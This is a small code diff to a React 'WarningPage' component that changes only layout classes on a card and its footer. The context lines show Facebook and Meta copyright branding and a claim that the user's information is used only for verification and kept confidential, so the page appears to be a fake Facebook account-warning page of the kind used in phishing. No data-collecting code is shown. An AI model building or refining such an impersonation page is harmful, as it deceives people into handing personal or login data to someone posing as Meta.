@@ -30,7 +30,7 @@ export default function WarningPage() {
 
   return (
     <>
-      <Card className="w-full max-w-2xl mx-auto bg-white rounded-lg shadow-md">
+      <Card className="w-full bg-white rounded-lg shadow-md">
         <CardContent className="p-8">
           <div className="flex justify-between items-center mb-8">
             <img 
@@ -145,7 +145,7 @@ export default function WarningPage() {
         </CardContent>
       </Card>
 
-      <div className="w-full max-w-2xl mx-auto text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
+      <div className="w-full text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
         <p>Your information is used only for verification purposes. All data is confidential.</p>
         <p>© Facebook 2023 • Meta Platforms, Inc.</p>
       </div>
